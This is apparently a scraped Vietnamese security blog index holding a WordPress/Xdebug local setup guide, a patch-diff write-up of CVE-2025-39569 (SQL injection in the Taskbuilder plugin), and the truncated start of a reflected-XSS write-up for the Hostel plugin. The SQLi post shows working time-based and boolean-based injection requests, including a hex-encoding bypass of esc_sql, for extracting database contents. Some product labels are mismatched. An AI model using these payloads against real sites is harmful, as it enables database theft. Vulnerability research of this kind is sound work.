B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size M·∫∑c ƒë·ªãnh, WordPress ph·ª• thu·ªôc v√†o c·∫•u h√¨nh PHP (upload_max_filesize, post_max_size, v√† ƒë√¥i khi c·∫£ max_execution_time) ƒë·ªÉ x√°c ƒë·ªãnh dung l∆∞·ª£ng file t·ªëi ƒëa c√≥ th·ªÉ upload. Tr√™n nhi·ªÅu hosting, gi·ªõi h·∫°n n√†y ch·ªâ kho·∫£ng 2MB ‚Äì 8MB, kh√¥ng ƒë·ªß cho c√°c plugin hi·ªán ƒë·∫°i.\nWhy Increase the Limit? Plugin dung l∆∞·ª£ng l·ªõn: C√°c plugin nh∆∞ WooCommerce extension, page builder, backup, ho·∫∑c security suite c√≥ th·ªÉ n·∫∑ng 20MB ‚Äì 100MB.\nTr√°nh l·ªói upload: N·∫øu file .zip l·ªõn h∆°n gi·ªõi h·∫°n, b·∫°n s·∫Ω g·∫∑p l·ªói:\n‚ÄúThe uploaded file exceeds the upload_max_filesize directive in php.ini‚Äù Ho·∫∑c upload th·∫•t b·∫°i. Thu·∫≠n ti·ªán cho qu·∫£n tr·ªã vi√™n: C√≥ th·ªÉ c√†i tr·ª±c ti·∫øp qua Dashboard m√† kh√¥ng c·∫ßn FTP/SSH.\nH·ªó tr·ª£ ph√°t tri·ªÉn plugin: Plugin t·ª± vi·∫øt k√®m nhi·ªÅu th∆∞ vi·ªán/asset c√≥ th·ªÉ kh√° n·∫∑ng, vi·ªác tƒÉng gi·ªõi h·∫°n gi√∫p test d·ªÖ d√†ng h∆°n.\nHow to Increase Plugin Upload Size S·ª≠a php.ini (n·∫øu c√≥ quy·ªÅn server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 S·ª≠a file .htaccess (n·∫øu d√πng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Th√™m v√†o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); üëâ L·ªùi khuy√™n: Ch·ªâ n√™n ƒë·∫∑t gi·ªõi h·∫°n v·ª´a ƒë·ªß (64MB ho·∫∑c 128MB). Tr√°nh ƒë·∫∑t qu√° l·ªõn ƒë·ªÉ h·∫°n ch·∫ø nguy c∆° b·ªã upload file n·∫∑ng g√¢y qu√° t·∫£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Taskbuilder c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.0.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) v√† v4.0.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n '...'. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ OR, AND,...) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/admin/projects/get_users.php\nTrong phi√™n b·∫£n v4.0.1, bi·∫øn $proj_id sau khi escape ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u truy v·∫•n m√† kh√¥ng c√≥ d·∫•u nh√°y ƒë∆°n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n·ªû b·∫£n v4.0.2, truy v·∫•n ƒë√£ ƒë∆∞·ª£c ƒëi·ªÅu ch·ªânh b·∫±ng c√°ch ƒë·∫∑t $proj_id trong d·∫•u nh√°y ƒë∆°n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.2\u0026rdquo; }\nB·∫£n v√° n√†y ƒë·∫£m b·∫£o r·∫±ng gi√° tr·ªã $proj_id sau khi escape ƒë∆∞·ª£c coi l√† m·ªôt chu·ªói literal, kh√¥ng th·ªÉ tho√°t ra kh·ªèi d·∫•u nh√°y ƒë∆°n ƒë·ªÉ ch√®n th√™m c√∫ ph√°p SQL, qua ƒë√≥ ngƒÉn ch·∫∑n t·∫•n c√¥ng SQL Injection.\nHow it work? File architecture:\nC·∫•u tr√∫c chung c·ªßa file hi·ªán t·∫°i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o n·ªôi dung ch√≠nh (body) c·ªßa modal ob_start(); // ... render HTML danh s√°ch users $body = ob_get_clean(); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o ph·∫ßn footer c·ªßa modal ob_start(); // ... render HTML c√°c n√∫t thao t√°c (Close, Save) $footer = ob_get_clean(); // Tr·∫£ d·ªØ li·ªáu JSON ƒë·ªÉ frontend hi·ªÉn th·ªã modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n$proj_id / $project: L·∫•y d·ªØ li·ªáu project t·ª´ database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay v√¨ xu·∫•t tr·ª±c ti·∫øp, gi√∫p gom n·ªôi dung v√†o bi·∫øn. $body / $footer: Ch·ª©a n·ªôi dung HTML ƒë·ªông c·ªßa modal. json_encode(): Tr·∫£ JSON cho client, c√≥ kh·∫£ nƒÉng ƒë∆∞·ª£c s·ª≠ d·ª•ng trong Ajax ƒë·ªÉ hi·ªÉn th·ªã modal m√† kh√¥ng c·∫ßn refresh trang. File n·∫±m trong th∆∞ m·ª•c includes cho th·∫•y r·∫±ng n√≥ s·∫Ω ƒë∆∞·ª£c g·ªçi ·ªü 1 ch·ª©c nƒÉng n√†o ƒë√≥ ·ªü n∆°i kh√°c. ƒê·ªÉ bi·∫øt ch·ª©c nƒÉng n√†o s·ª≠ d·ª•ng n√≥, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_users.php trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ N√≥ ƒë∆∞·ª£c include trong h√†m wppm_get_users() c·ªßa class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() l√† callback c·ªßa action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } {: file=\u0026ldquo;includes/class-wppm-admin.php v4.0.1\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. wp_ajax_wppm_get_users l√† t√™n hook Ajax, v·ªõi quy t·∫Øc ƒë·∫∑t t√™n: wp_ajax_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ƒë√£ ƒëƒÉng nh·∫≠p. wp_ajax_nopriv_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ch∆∞a ƒëƒÉng nh·∫≠p. ·ªû ƒë√¢y, action = wppm_get_users. Nghƒ©a l√† n·∫øu trong Ajax request b·∫°n g·ª≠i action=wppm_get_users t·ªõi admin-ajax.php, th√¨ WordPress s·∫Ω t√¨m callback t∆∞∆°ng ·ª©ng ƒë·ªÉ x·ª≠ l√Ω, ·ªü ƒë√¢y l√† wppm_get_users(). üëâ Ta ƒë√£ bi·∫øt ƒë∆∞·ª£c action = wppm_get_users, ki·ªÉm tra xem Ajax n√†o s·ª≠ d·ª•ng action n√†y b·∫±ng c√°ch t√¨m t·ª´ kh√≥a wppm_get_users tr√™n c√°c file .js trong th∆∞ m·ª•c ch·ª©a plugin.\nAction wppm_get_users l√† ph·∫ßn data trong request POST c·ªßa h√†m wppm_get_users()\nH√†m wppm_get_users() s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t trong HTML attribute c·ªßa ch·ª©c nƒÉng project\nT·∫°o project m·ªõi Truy c·∫≠p v√†o project ƒë√≥ Inspect code v√† t√¨m h√†m wppm_get_users s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t ·ªü ƒë√¢u, h√†nh ƒë·ªông n√†o s·∫Ω g·ªçi n√≥ üëâ Khi click v√†o icon b√™n c·∫°nh Users ajax s·∫Ω ho·∫°t ƒë·ªông, g·ª≠i request ƒë·∫øn server, l·∫•y danh s√°ch c√°c user tham gia project v√† m√£ HTML hi·ªÉn th·ªã n√≥.\nExploit Detect SQLi B·∫Øt request b·∫±ng BurpSuite, g·ª≠i request v·ªõi SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id ƒë√∫ng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w t∆∞∆°ng ·ª©ng v·ªõi m√£ HEX l√† 0x77 {: .prompt-info }\nS·ª≠ d·ª•ng SUBSTRING(STRING,1,1) ƒë·ªÉ l·∫•y k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa chu·ªói\n·ªû ƒë√¢y, $proj_id b·∫±ng 4 v√¨ SUBSTRING('wordpress',1,1)=0x77 l√† ƒë√∫ng n√™n SELECT l·∫•y gi√° tr·ªã ƒë√∫ng trong IF(condition, value if true, value if false), 4 l√† gi√° tr·ªã c√≥ th·ª±c trong database, n√™n response tr·∫£ v·ªÅ ch·ª©a danh s√°ch ng∆∞·ªùi tham gia d·ª± √°n\nS·ª≠ d·ª•ng HEX technique ƒë·ªÉ bypass h√†m esc_sql() ·ªü tr√™n, d√πng ƒë·ªÉ so s√°nh khi kh√¥ng s·ª≠ d√πng ƒë∆∞·ª£c '\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) V·ªõi proj_id kh√¥ng c√≥ th·ª±c trong database, response s·∫Ω tr·∫£ v·ªÅ k·∫øt qu·∫£ ch·ª©a None\nüëâ Ta ƒë√£ l·∫•y ƒë∆∞·ª£c k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa database name b·∫±ng k·ªπ thu·∫≠t boolean base\nproj_id ƒë√πng: response kh√¥ng ch·ª©a None proj_id sai: response ch·ª©a None C√≥ th·ªÉ s·ª≠ d·ª•ng k·ªπ thu·∫≠t time base nh∆∞ng khi dump s·ªë l∆∞·ª£ng l·ªõn data, th·ªùi gian dump s·∫Ω r·∫•t l√¢u {: .prompt-info }\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t boolean base ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-39569 trong plugin WordPress Taskbuilder xu·∫•t ph√°t t·ª´ vi·ªác thi·∫øu d·∫•u nh√°y ƒë∆°n '...' bao quanh d·ªØ li·ªáu ƒë·∫ßu v√†o trong c√¢u l·ªánh SQL, khi·∫øn d·ªØ li·ªáu ng∆∞·ªùi d√πng c√≥ th·ªÉ ƒë∆∞·ª£c di·ªÖn gi·∫£i nh∆∞ m·ªôt ph·∫ßn c·ªßa c√¢u l·ªánh SQL h·ª£p l·ªá.\nB·∫£n v√° ·ªü phi√™n b·∫£n 4.0.2 ƒë√£ kh·∫Øc ph·ª•c v·∫•n ƒë·ªÅ b·∫±ng c√°ch ƒë∆∞a $proj_id v√†o trong '...', ƒë·∫£m b·∫£o n√≥ lu√¥n ƒë∆∞·ª£c x·ª≠ l√Ω nh∆∞ m·ªôt literal string trong SQL.\nKey takeaways:\n∆Øu ti√™n s·ª≠ d·ª•ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay v√¨ t·ª± ch√®n d·ªØ li·ªáu v√†o query. ƒê·ªëi v·ªõi c√°c plugin WordPress, c·∫ßn test k·ªπ l∆∞·ª°ng c√°c Ajax endpoint v√¨ ƒë√¢y l√† n∆°i d·ªÖ xu·∫•t hi·ªán SQLi v√† XSS nh·∫•t. Ng∆∞·ªùi qu·∫£n tr·ªã c·∫ßn th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin/theme ƒë·ªÉ nh·∫≠n b·∫£n v√° k·ªãp th·ªùi. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-08-31-cve-2025-39569/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) v√† v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ \u003cstrong\u003ex·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o\u003c/strong\u003e tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n \u003ccode\u003e'...'\u003c/code\u003e. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Hostel c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.1.5.8. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ admin.\nCVE ID: CVE-2025-6234 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 1.1.5.8 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.7(vul) v√† v1.1.5.8(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán sanitize (l√†m s·∫°ch d·ªØ li·ªáu) v√† escape (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng Reflected Cross-Site Scripting (XSS)\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü 2 file views/bookings.html.php v√† controllers/bookings.php\nFile views/bookings.html.php\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset - $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[previous page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset + $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[next page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt;\t\u0026lt;/p\u0026gt; {: 